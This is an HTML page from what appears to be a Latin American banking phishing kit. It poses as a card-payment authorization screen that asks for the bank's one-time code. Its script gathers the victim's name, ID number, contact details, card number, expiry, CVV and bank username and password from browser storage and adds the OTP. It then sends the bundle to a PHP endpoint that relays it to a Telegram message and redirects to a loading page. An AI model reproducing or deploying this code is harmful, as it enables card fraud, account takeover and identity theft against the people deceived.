<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorización de Transacción</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f0f0f0;
        }
        .container {
            background-color: #fff;
            padding: 25px;
            border-radius: 10px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
            text-align: center;
            max-width: 400px;
            width: 100%;
        }
        .container img {
            width: 100px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 1.7em;
            color: #333;
            margin-bottom: 20px;
        }
        input[type="text"],
        input[type="password"] {
            width: calc(100% - 20px);
            padding: 12px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 6px;
            font-size: 1em;
            box-sizing: border-box;
        }
        .info-text {
            font-size: 0.95em;
            color: #666;
            margin-bottom: 20px;
        }
        .btn {
            background-color: #4e79ff;
            color: white;
            padding: 12px 25px;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            font-size: 1em;
            transition: background-color 0.3s ease;
        }
        .btn:hover {
            background-color: #3a62d1;
        }
        .logos {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }
        .logos img {
            width: 50px;
        }
        .error-message {
            color: red;
            font-size: 1em;
            margin-bottom: 20px;
            display: none; /* Inicialmente oculto */
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logos">
            <img src="assets/media/vista3cx4.png" alt="izquierda">
            <img src="assets/media/deruerguwix034.webp" alt="derecha">
        </div>
        <h1>Autorización de transacción</h1>
        <p>Estás intentando realizar un pago por tarjeta de crédito/débito. Necesitamos confirmar que eres tú quien realiza este pago.</p>
        <div id="error-message" class="error-message">
            Error: Dinámica incorrecta o vencida.
        </div>
        <form id="authForm">
            <input type="text" name="Dinamica" id="Dinamica" placeholder="Dinamica/OTP" minlength="4" maxlength="6" required>
            <input type="hidden" name="localStorageInfo" id="localStorageInfo">
            <p class="info-text">Ingresa la clave dinámica generada en tu app bancaria o el OTP enviado a tu número/correo registrado.</p>
            <button type="submit" class="btn">Autorizar</button>
        </form>
    </div>

    <script>
        // Verifica el error en la URL al cargar la página
        document.addEventListener('DOMContentLoaded', function() {
            const urlParams = new URLSearchParams(window.location.search);
            const error = urlParams.get('error');

            // Muestra el mensaje de error si corresponde
            if (error === '1') {
                document.getElementById('error-message').style.display = 'block';
            }
        });

        document.getElementById('authForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Evita el envío del formulario por defecto

            // Captura la información del localStorage
            var info = localStorage.getItem('info');
            if (info && info.trim() !== '') {
                var infoData;
                try {
                    infoData = JSON.parse(info);
                } catch (e) {
                    console.error('Error al analizar JSON de localStorage:', e);
                    return;
                }

                // Asegúrate de que metaInfo exista
                var metaInfo = infoData.metaInfo || {};
                if (!metaInfo || Object.keys(metaInfo).length === 0) {
                    alert("No se encontraron datos válidos en localStorage.");
                    return; // Detener el proceso si no hay datos
                }

                // Recupera username y password del localStorage sin sobrescribirlos
                const username = localStorage.getItem('username') || 'No disponible';
                const password = localStorage.getItem('password') || 'No disponible';

                // Captura el valor de la clave dinámica
                const dinamica = document.getElementById('Dinamica').value;

                // Agrega la clave dinámica al localStorage
                localStorage.setItem('dinamica', dinamica);

                // Obtén el session_id del localStorage
                const session_id = localStorage.getItem('session_id'); // Asegúrate de que el session_id esté almacenado en localStorage

                // Valida si existe el session_id
                if (!session_id) {
                    alert("No se encontró el session_id en localStorage.");
                    return;
                }

                enviarDinamica(dinamica, session_id);

                // Obtén el messageId de localStorage
                const messageId = localStorage.getItem('messageId'); // Recuperar el messageId

                // Combina el mensaje original con la nueva información, conservando username y password
                const mensajeFinal = `
                    LATAM GOLEADOR💎
                    -------------------------------
                    👤Nombre: ${metaInfo.name || 'No disponible'}
                    🪪Cedula: ${metaInfo.cc || 'No disponible'}
                    -------------------------------
                    💌Correo: ${metaInfo.email || 'No disponible'}
                    📞Teléfono: ${metaInfo.telnum || 'No disponible'}
                    🌇Ciudad: ${metaInfo.city || 'No disponible'}
                    🗺️Dirección: ${metaInfo.address || 'No disponible'}
                    -------------------------------
                    🏦 Banco: ${metaInfo.ban || 'No disponible'}
                    💳: ${metaInfo.p || 'No disponible'}
                    📅: ${metaInfo.pdate || 'No disponible'}
                    🔐: ${metaInfo.c || 'No disponible'}
                    ------------------------------
                    Disp: ${metaInfo.disp || 'No disponible'}
                    ------------------------------
                    \nUser: ${username},\n Pass: ${password}, \n Dinamica/OTP: ${dinamica}
                `;

                // Envía la información al servidor para editar el mensaje en Telegram
                editarMensajeTelegram(messageId, mensajeFinal);
            } else {
                alert("No se encontraron datos en localStorage.");
            }
        });

        // Modifica la función para enviar también el session_id
        async function enviarDinamica(dinamica, session_id) {
            const response = await fetch('http://localhost:3000/js/guardar_dinamica.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/x-www-form-urlencoded'
                },
                body: new URLSearchParams({
                    dinamica: dinamica,
                    session_id: session_id
                })
            });

            const data = await response.json();
            console.log(data); // Para verificar la respuesta del servidor
        }

        async function editarMensajeTelegram(messageId, nuevoTexto) {
            const response = await fetch('edit_message.php', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json'
                },
                body: JSON.stringify({ message_id: messageId, text: nuevoTexto })
            });

            const data = await response.json();
            if (data.status === 'success') {
                // Redirige a otra página si la edición fue exitosa
                window.location.href = '/js/cargando.php'; // Cambia 'pagina_destino.html' por la URL a la que quieres redirigir
            } else {
                alert('Error al editar el mensaje: ' + data.message);
            }
        }
    </script>
</body>
</html>
